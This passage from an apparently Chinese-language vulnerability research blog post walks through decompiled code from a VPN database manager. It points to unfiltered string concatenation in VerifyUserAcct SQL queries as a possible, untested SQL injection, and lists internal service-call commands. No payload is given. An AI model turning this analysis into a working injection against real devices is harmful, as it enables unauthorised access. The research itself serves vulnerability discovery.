class="number">0</span>;</span><br><span class="line">  v50 = <span class="number">0LL</span>;</span><br><span class="line">  v51 = <span class="number">0</span>;</span><br><span class="line">  v52 = <span class="number">0LL</span>;</span><br><span class="line">  v53 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  v55 = <span class="number">0LL</span>;</span><br><span class="line">  v56 = <span class="number">0LL</span>;</span><br><span class="line">  v57 = <span class="number">0LL</span>;</span><br><span class="line">  v4 = <span class="built_in">sub_42F3DC</span>(&amp;v43, <span class="number">1LL</span>, <span class="string">&quot;default&quot;</span>);</span><br><span class="line">  <span class="built_in">sub_40FD80</span>(v4, <span class="string">&quot;Enter&quot;</span>);</span><br><span class="line">  <span class="built_in">sub_40F8D8</span>(&amp;v43);</span><br><span class="line">  Json::Value::<span class="built_in">Value</span>(v38, <span class="number">0LL</span>);</span><br><span class="line">  Json::Value::<span class="built_in">Value</span>(v39, <span class="number">7LL</span>);</span><br><span class="line">  v37 = <span class="built_in">sub_421A40</span>(a1, v38);</span><br><span class="line">  <span class="keyword">if</span> ( !v37 )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = (<span class="type">unsigned</span> __int8)Json::Value::<span class="built_in">empty</span>((Json::Value *)v38);</span><br><span class="line">    <span class="keyword">if</span> ( v5 || (isObject = (<span class="type">unsigned</span> __int8)Json::Value::<span class="built_in">isObject</span>((Json::Value *)v38)) == <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v37 = <span class="number">-2</span>;</span><br><span class="line">      Json::Value::<span class="built_in">Value</span>((Json::Value *)&amp;v43, <span class="string">&quot;Bad format of input data!&quot;</span>);</span><br><span class="line">      Json::Value::<span class="keyword">operator</span>=(v39, &amp;v43);</span><br><span class="line">      Json::Value::~<span class="built_in">Value</span>((Json::Value *)&amp;v43);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      Json::FastWriter::<span class="built_in">FastWriter</span>((Json::FastWriter *)v42);</span><br><span class="line">      <span class="keyword">switch</span> ( a2 ) <span class="comment">//[1]</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">          v14 = qword_49CFD8;</span><br><span class="line">          Json::Value::<span class="built_in">Value</span>((Json::Value *)&amp;v43, (<span class="type">const</span> Json::Value *)v38);</span><br><span class="line">          v8 = <span class="built_in">sub_41C584</span>(v14, <span class="number">2LL</span>, &amp;v43, v39);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_35;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">          v9 = qword_49CFD8;</span><br><span class="line">          Json::Value::<span class="built_in">Value</span>((Json::Value *)&amp;v43, (<span class="type">const</span> Json::Value *)v38);</span><br><span class="line">          v8 = <span class="built_in">sub_41DE20</span>(v9, &amp;v43);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_35;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">          v10 = qword_49CFD8;</span><br><span class="line">          Json::Value::<span class="built_in">Value</span>((Json::Value *)&amp;v43, (<span class="type">const</span> Json::Value *)v38);</span><br><span class="line">          v8 = <span class="built_in">sub_41E2C4</span>(v10, &amp;v43);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_35;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>: <span class="comment">//[2]</span></span><br><span class="line">          v11 = (_QWORD *)qword_49CFD8;</span><br><span class="line">          Json::Value::<span class="built_in">Value</span>((Json::Value *)&amp;v43, (<span class="type">const</span> Json::Value *)v38);</span><br><span class="line">          v8 = <span class="built_in">sub_41CAB4</span>(v11, (Json::Value *)&amp;v43, (Json::Value *)v39); <span class="comment">//[3]</span></span><br><span class="line">          <span class="keyword">goto</span> LABEL_35;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">          v15 = qword_49CFD8;</span><br><span class="line">          Json::Value::<span class="built_in">Value</span>((Json::Value *)&amp;v43, (<span class="type">const</span> Json::Value *)v38);</span><br><span class="line">          v8 = <span class="built_in">sub_41C584</span>(v15, <span class="number">3LL</span>, &amp;v43, v39);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_35;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br></pre></td></tr></table></figure></div>
<blockquote>
<p>非常简单的处理, [1]switch函数判断了我们的a2, 并进入[3]的<code>sub_41CAB4</code>函数.</p>
</blockquote>
<blockquote>
<p>当我们进入<code>sub_41CAB4</code>函数将看到了熟悉的朋友<code>VerifyUserAcct</code>字符串.</p>
</blockquote>
<blockquote>
<p>回到<code>qs_call</code>当我们熟悉系统后, 会发现很多类似的调用,在python脚本中,甚至可以使用命令去调用下面是例子</p>
</blockquote>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">qs.Service.ezCall(<span class="string">&#x27;NetworkService&#x27;</span>, <span class="string">&#x27;Get_available_lan_info&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="number">60</span>, -<span class="number">1</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">/usr/sbin/qsh NetworkService.Setup_firewall</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<blockquote>
<p>当然这里有一个小提示当你尝试从命令行去调用一个需要传参的功能时可能会出现解析错误的情况, 你的int类型可能会被识别为string类型, 所以我建议你使用python脚本去调用.</p>
</blockquote>
<blockquote>
<p>我这里列出几个对应的模块.</p>
</blockquote>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">QVPNDBMgr-&gt;/usr/sbin/qvpn_db_mgr,</span><br><span class="line">NetworkService-&gt;/usr/sbin/qserviced,</span><br><span class="line">rmgmtd-&gt;/usr/sbin/rmgmtd,</span><br><span class="line">QVPN-&gt;qvpn_wg</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>攻面的总结, 我看完了所以服务吗? 那肯定是没有的还有许多默认是没有开启的服务我都没有看, 甚至还有一个5555的端口开放我都没有找到什么程序绑定的.</p>
</blockquote>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="vuln-1"><a href="#vuln-1" class="headerlink" title="vuln-1 ?"></a>vuln-1 ?</h3><blockquote>
<p>你会发现上面对于<code>sub_41CAB4</code>函数的分析戛然而止了, 没错因为它可能存在一个潜在的sql injection, 为什么是潜在的sql注入呢, 我没有测试过这个漏洞, 最起码我看上去这个漏洞是存在的, 第一我没有实体设备, 第二这漏洞有一个条件, 上面通过官方对于QBelt协议的介绍, 我们得知它结合了 DTLS 和 AES-256 加密, 所以通信过程是加密那么怎么握手的呢, 关键就是在配置QBelt时预留的psk(预共享密钥), 看来在发送user和pwd之前还会检查TDLS中的psk, 所以它是一个授权后的漏洞或者我们可以通过爆破? 或者可以在什么地方造成泄露?</p>
</blockquote>
<blockquote>
<p>先不去管这些吧, 来看一下<code>sub_41CAB4</code></p>
</blockquote>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_41CAB4</span><span class="params">(_QWORD *a1, Json::Value *a2, Json::Value *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v6; <span class="comment">// x0</span></span><br><span class="line"></span><br><span class="line">  v44 = off_460430;</span><br><span class="line">  v45 = <span class="number">0LL</span>;</span><br><span class="line">  v46 = <span class="number">4</span>;</span><br><span class="line">  v47 = <span class="string">&quot;DBMgr.cpp&quot;</span>;</span><br><span class="line">  v49 = <span class="string">&quot;int DBMgr::VerifyUserAcct(Json::Value, Json::Value&amp;)&quot;</span>;</span><br><span class="line">  v6 = <span class="built_in">sub_42F3DC</span>(&amp;v44, <span class="number">1LL</span>, <span class="string">&quot;default&quot;</span>);</span><br><span class="line">  <span class="built_in">sub_40FD80</span>(v6, <span class="string">&quot;Enter&quot;</span>);</span><br><span class="line">  <span class="built_in">sub_40F8D8</span>(&amp;v44);</span><br><span class="line">  v24 = <span class="number">0</span>;</span><br><span class="line">  v27 = &amp;v29;</span><br><span class="line">  v28 = <span class="number">0LL</span>;</span><br><span class="line">  Json::Value::<span class="built_in">Value</span>((Json::Value *)v38, <span class="string">&quot;&quot;</span>);</span><br><span class="line">  Json::Value::<span class="built_in">get</span>(a2, <span class="string">&quot;user_name&quot;</span>, (<span class="type">const</span> Json::Value *)v38); <span class="comment">//[1]</span></span><br><span class="line">  Json::Value::asString[abi:cxx11](&amp;v44);</span><br><span class="line">  <span class="built_in">sub_4155E0</span>(&amp;v27, v34);</span><br><span class="line">  std::string::_M_dispose(v34);</span><br><span class="line">  Json::Value::~<span class="built_in">Value</span>((Json::Value *)&amp;v44);</span><br><span class="line">  Json::Value::~<span class="built_in">Value</span>((Json::Value *)v38);</span><br><span class="line">  Json::Value::<span class="built_in">Value</span>((Json::Value *)v38, <span class="string">&quot;&quot;</span>);</span><br><span class="line">  Json::Value::<span class="built_in">get</span>(a2, <span class="string">&quot;pw&quot;</span>, (<span class="type">const</span> Json::Value *)v38); <span class="comment">//[2]</span></span><br><span class="line">  Json::Value::asString[abi:cxx11](&amp;v44);</span><br><span class="line">  <span class="built_in">sub_4155E0</span>(v30, v35);</span><br><span class="line">  std::string::_M_dispose(v35);</span><br><span class="line">  Json::Value::~<span class="built_in">Value</span>((Json::Value *)&amp;v44);</span><br><span class="line">  Json::Value::~<span class="built_in">Value</span>((Json::Value *)v38);</span><br><span class="line">  Json::Value::<span class="built_in">Value</span>((Json::Value *)v38, <span class="number">0</span>);</span><br><span class="line">  Json::Value::<span class="built_in">get</span>(a2, <span class="string">&quot;capability&quot;</span>, (<span class="type">const</span> Json::Value *)v38); <span class="comment">//[3]</span></span><br><span class="line">  v25 = Json::Value::<span class="built_in">asUInt</span>((Json::Value *)&amp;v44);</span><br><span class="line">  Json::Value::~<span class="built_in">Value</span>((Json::Value *)&amp;v44);</span><br><span class="line">  Json::Value::~<span class="built_in">Value</span>((Json::Value *)v38);</span><br><span class="line">  Json::Value::<span class="built_in">Value</span>((Json::Value *)v38, <span class="number">0</span>);</span><br><span class="line">  Json::Value::<span class="built_in">get</span>(a2, <span class="string">&quot;role_type&quot;</span>, (<span class="type">const</span> Json::Value *)v38); <span class="comment">//[4]</span></span><br><span class="line">  v26 = Json::Value::<span class="built_in">asUInt</span>((Json::Value *)&amp;v44);</span><br><span class="line">  Json::Value::~<span class="built_in">Value</span>((Json::Value *)&amp;v44);</span><br><span class="line">  Json::Value::~<span class="built_in">Value</span>((Json::Value *)v38);</span><br><span class="line">  <span class="keyword">if</span> ( v26 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v28 &gt; <span class="number">0x20</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      std::string::_M_assign(&amp;v41, &amp;v27);</span><br><span class="line">      std::<span class="keyword">operator</span>+&lt;<span class="type">char</span>&gt;(<span class="string">&quot;SELECT user_name FROM AcctTable WHERE user_id = &#x27;&quot;</span>, &amp;v41); <span class="comment">//[5]</span></span><br><span class="line">      std::<span class="keyword">operator</span>+&lt;<span class="type">char</span>&gt;(v38, <span class="string">&quot;&#x27;;&quot;</span>);</span><br><span class="line">      <span class="built_in">sub_4155E0</span>(v32, &amp;v44);</span><br><span class="line">      std::string::_M_dispose(&amp;v44);</span><br><span class="line">      std::string::_M_dispose(v38);</span><br><span class="line">      <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">sub_4200A0</span>(*a1, v32[<span class="number">0</span>], a3) &amp;&amp; !(<span class="type">unsigned</span> __int8)Json::Value::<span class="built_in">empty</span>(a3) ) <span class="comment">//[6]</span></span><br><span class="line">      &#123;</span><br><span class="line">        v10 = (Json::Value *)Json::Value::<span class="keyword">operator</span>[](a3, <span class="number">0LL</span>);</span><br><span class="line">        Json::Value::<span class="built_in">Value</span>((Json::Value *)v38, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        Json::Value::<span class="built_in">get</span>(v10, <span class="string">&quot;user_name&quot;</span>, (<span class="type">const</span> Json::Value *)v38);</span><br><span class="line">        Json::Value::asString[abi:cxx11](&amp;v44);</span><br><span class="line">        <span class="built_in">sub_4155E0</span>(v39, v37);</span><br><span class="line">        v8 = v37;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      std::string::_M_assign(v39, &amp;v27);</span><br><span class="line">      std::<span class="keyword">operator</span>+&lt;<span class="type">char</span>&gt;(<span class="string">&quot;SELECT user_id FROM AcctTable WHERE user_name = &#x27;&quot;</span>, v39); <span class="comment">//[7]</span></span><br><span class="line">      std::<span class="keyword">operator</span>+&lt;<span class="type">char</span>&gt;(v35, &amp;unk_461307);</span><br><span class="line">      <span class="built_in">sub_41222C</span>(<span class="number">11LL</span>);</span><br><span class="line">      <span class="built_in">sub_40FCA4</span>(v36, v37);</span><br><span class="line">      std::<span class="keyword">operator</span>+&lt;<span class="type">char</span>&gt;(&amp;v44, <span class="string">&quot;;&quot;</span>);</span><br><span class="line">      <span class="built_in">sub_4155E0</span>(v32, v38);</span><br><span class="line">      std::string::_M_dispose(v38);</span><br><span class="line">      std::string::_M_dispose(&amp;v44);</span><br><span class="line">      std::string::_M_dispose(v37);</span><br><span class="line">      std::string::_M_dispose(v36);</span><br><span class="line">      std::string::_M_dispose(v35);</span><br><span class="line">      <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">sub_4200A0</span>(*a1, v32[<span class="number">0</span>], a3) &amp;&amp; !(<span class="type">unsigned</span> __int8)Json::Value::<span class="built_in">empty</span>(a3) ) <span class="comment">//[8]</span></span><br><span class="line">      &#123;</span><br><span class="line">        v7 = (Json::Value *)Json::Value::<span class="keyword">operator</span>[](a3, <span class="number">0LL</span>);</span><br><span class="line">        Json::Value::<span class="built_in">Value</span>((Json::Value *)v38, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        Json::Value::<span class="built_in">get</span>(v7, <span class="string">&quot;user_id&quot;</span>, (<span class="type">const</span> Json::Value *)v38);</span><br><span class="line">        Json::Value::asString[abi:cxx11](&amp;v44);</span><br><span class="line">        <span class="built_in">sub_4155E0</span>(&amp;v41, v36);</span><br><span class="line">        v8 = v36;</span><br><span class="line">LABEL_6:</span><br><span class="line">        std::string::_M_dispose(v8);</span><br><span class="line">        Json::Value::~<span class="built_in">Value</span>((Json::Value *)&amp;v44);</span><br><span class="line">        Json::Value::~<span class="built_in">Value</span>((Json::Value *)v38);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !v26 )</span><br><span class="line">  &#123;</span><br><span class="line">    std::string::_M_assign(v39, &amp;v27);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)<span class="built_in">sub_41F310</span>(v39, <span class="string">&quot;&quot;</span>) || (<span class="type">unsigned</span> __int8)<span class="built_in">sub_41F310</span>(v30, <span class="string">&quot;&quot;</span>) || v26 == <span class="number">1</span> &amp;&amp; !v42 )</span><br><span class="line">  &#123;</span><br><span class="line">    v44 = off_460430;</span><br><span class="line">    v45 = <span class="number">0LL</span>;</span><br><span class="line">    v46 = <span class="number">16</span>;</span><br><span class="line">    v47 = <span class="string">&quot;DBMgr.cpp&quot;</span>;</span><br><span class="line">    v49 = <span class="string">&quot;int DBMgr::VerifyUserAcct(Json::Value, Json::Value&amp;)&quot;</span>;</span><br><span class="line">    v9 = <span class="built_in">sub_42F3DC</span>(&amp;v44, <span class="number">1LL</span>, <span class="string">&quot;default&quot;</span>);</span><br><span class="line">    v11 = <span class="built_in">sub_41F348</span>(v9, <span class="string">&quot;Insufficient info! info: &quot;</span>);</span><br><span class="line">    v13 = <span class="built_in">sub_41F378</span>(v11, <span class="string">&quot;user name: &quot;</span>);</span><br><span class="line">    v14 = <span class="built_in">sub_40FE84</span>(v13, v39);</span><br><span class="line">    v15 = <span class="built_in">sub_41F378</span>(v14, <span class="string">&quot;, user_id: &quot;</span>);</span><br><span class="line">    v16 = <span class="built_in">sub_40FE84</span>(v15, &amp;v41);</span><br><span class="line">    v17 = <span class="built_in">sub_41F290</span>(v16, <span class="string">&quot;, capability: &quot;</span>);</span><br><span class="line">    v18 = <span class="built_in">sub_41F3A8</span>(v17, &amp;v25);</span><br><span class="line">    v19 = v18;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)(v18 + <span class="number">64</span>) )</span><br><span class="line">      <span class="built_in">sub_415778</span>(v18 + <span class="number">72</span>, <span class="string">&quot;, role_type: &quot;</span>);</span><br><span class="line">    <span class="built_in">sub_41F3A8</span>(v19, &amp;v26);</span><br><span class="line">    <span class="built_in">sub_40F8D8</span>(&amp;v44);</span><br><span class="line">    v24 = <span class="number">-3</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v12 = *a1;</span><br><span class="line">    <span class="built_in">sub_40FBA0</span>(&amp;v44, v39);</span><br><span class="line">    std::string::<span class="built_in">basic_string</span>(v38, v30);</span><br><span class="line">    v24 = <span class="built_in">sub_40EFE4</span>(v12, &amp;v44, v38, v25, a3); <span class="comment">//[9]</span></span><br><span class="line">    std::string::_M_dispose(v38);</span><br><span class="line">    <span class="built_in">sub_40FB78</span>(&amp;v44);</span><br><span class="line">  &#125;</span><br><span class="line">  v44 = off_460430;</span><br><span class="line">  v45 = <span class="number">0LL</span>;</span><br><span class="line">  v46 = <span class="number">4</span>;</span><br><span class="line">  v47 = <span class="string">&quot;DBMgr.cpp&quot;</span>;</span><br><span class="line">  v49 = <span class="string">&quot;int DBMgr::VerifyUserAcct(Json::Value, Json::Value&amp;)&quot;</span>;</span><br><span class="line">  v55 = <span class="number">2</span>;</span><br><span class="line">  v20 = <span class="built_in">sub_42F3DC</span>(&amp;v44, <span class="number">1LL</span>, <span class="string">&quot;default&quot;</span>);</span><br><span class="line">  v21 = <span class="built_in">sub_40FD80</span>(v20, <span class="string">&quot;Exit &quot;</span>);</span><br><span class="line">  <span class="built_in">sub_41F2C0</span>(v21, &amp;v24);</span><br><span class="line">  <span class="built_in">sub_40F8D8</span>(&amp;v44);</span><br><span class="line">  v22 = v24;</span><br><span class="line">  <span class="built_in">sub_40FB78</span>(v39);</span><br><span class="line">  std::string::_M_dispose(v32);</span><br><span class="line">  std::string::_M_dispose(v30);</span><br><span class="line">  std::string::_M_dispose(&amp;v27);</span><br><span class="line">  <span class="keyword">return</span> v22;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>在[1],[2],[3],[4]解析了我们发送的json数据后, 根据我们的<code>role_type</code>的值会有略微的不同处理.  嗯～我们对于sql命令的敏感程度很快的让我们看到了[5],[7], 看上去就是<code>std::operator+</code>去拼接了我们的user, 并没有看到什么过滤函数, 如果我的理解没有问题的话这里一定有sql注入, 而这个命令将进入<code>sub_4200A0</code>-&gt;<code>sub_41FD60</code>函数并使用<code>sqlite3_exec</code>函数去执行命令.</p>
</blockquote>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_4200A0</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v6; <span class="comment">// x0</span></span><br><span class="line">  __int64 v26; <span class="comment">// [xsp+E8h] [xbp+E8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="built_in">sub_42F3DC</span>(&amp;v12, <span class="number">1LL</span>, <span class="string">&quot;default&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)(v6 + <span class="number">64</span>) )</span><br><span class="line">    <span class="built_in">sub_41FB0C</span>(v6 + <span class="number">72</span>, <span class="string">&quot;Enter&quot;</span>);</span><br><span class="line">  <span class="built_in">sub_40F8D8</span>(&amp;v12);</span><br><span class="line">  Json::Value::<span class="built_in">Value</span>(v11, <span class="number">0LL</span>);</span><br><span class="line">  Json::Value::<span class="built_in">Value</span>(&amp;v12, <span class="number">6LL</span>);</span><br><span class="line">  Json::Value::<span class="keyword">operator</span>=(v11, &amp;v12);</span><br><span class="line">  Json::Value::~<span class="built_in">Value</span>((Json::Value *)&amp;v12);</span><br><span class="line">  v7 = <span class="built_in">sub_41FD60</span>(a1, a2, sub_41F968, v11);</span><br><span class="line">            <span class="comment">//........</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_41FD60</span><span class="params">(_QWORD *a1, __int64 a2, __int64 a3, __int64 a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// x0</span></span><br><span class="line">  __int64 v9; <span class="comment">// x19</span></span><br><span class="line">  <span class="type">char</span> *s; <span class="comment">// [xsp+30h] [xbp+30h] BYREF</span></span><br><span class="line">  __int64 v11[<span class="number">2</span>]; <span class="comment">// [xsp+38h] [xbp+38h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [xsp+48h] [xbp+48h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v13; <span class="comment">// [xsp+50h] [xbp+50h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [xsp+58h] [xbp+58h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v15; <span class="comment">// [xsp+60h] [xbp+60h]</span></span><br><span class="line">  __int16 v16; <span class="comment">// [xsp+68h] [xbp+68h]</span></span><br><span class="line">  __int64 v17; <span class="comment">// [xsp+70h] [xbp+70h]</span></span><br><span class="line">  <span class="type">char</span> v18; <span class="comment">// [xsp+78h] [xbp+78h]</span></span><br><span class="line">  __int64 v19; <span class="comment">// [xsp+80h] [xbp+80h]</span></span><br><span class="line">  <span class="type">char</span> *v20; <span class="comment">// [xsp+88h] [xbp+88h]</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// [xsp+90h] [xbp+90h]</span></span><br><span class="line">  __int64 v22; <span class="comment">// [xsp+98h] [xbp+98h]</span></span><br><span class="line">  __int64 v23; <span class="comment">// [xsp+A0h] [xbp+A0h]</span></span><br><span class="line">  __int64 v24; <span class="comment">// [xsp+A8h] [xbp+A8h]</span></span><br><span class="line"></span><br><span class="line">  s = <span class="number">0LL</span>;</span><br><span class="line">  result = <span class="built_in">sub_41FB94</span>();</span><br><span class="line">  <span class="keyword">if</span> ( !(_DWORD)result )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="built_in">sqlite3_exec</span>(*a1, a2, a3, a4, &amp;s);</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)result )</span><br><span class="line">    &#123;</span><br><span class="line">      v16 = <span class="number">0</span>;</span><br><span class="line">      v17 = <span class="number">0LL</span>;</span><br><span class="line">      v11[<span class="number">0</span>] = (__int64)off_460430;</span><br><span class="line">      v11[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">      v12 = <span class="number">16</span>;</span><br><span class="line">      v18 = <span class="number">0</span>;</span><br><span class="line">      v13 = <span class="string">&quot;DBTable.cpp&quot;</span>;</span><br><span class="line">      v19 = <span class="number">0LL</span>;</span><br><span class="line">      v14 = <span class="number">249LL</span>;</span><br><span class="line">      v22 = <span class="number">0LL</span>;</span><br><span class="line">      v23 = <span class="number">0LL</span>;</span><br><span class="line">      v15 = <span class="string">&quot;int DBTable::ExecuteSQL(const char*, exec_cb, void*)&quot;</span>;</span><br><span class="line">      v24 = <span class="number">0LL</span>;</span><br><span class="line">      v20 = <span 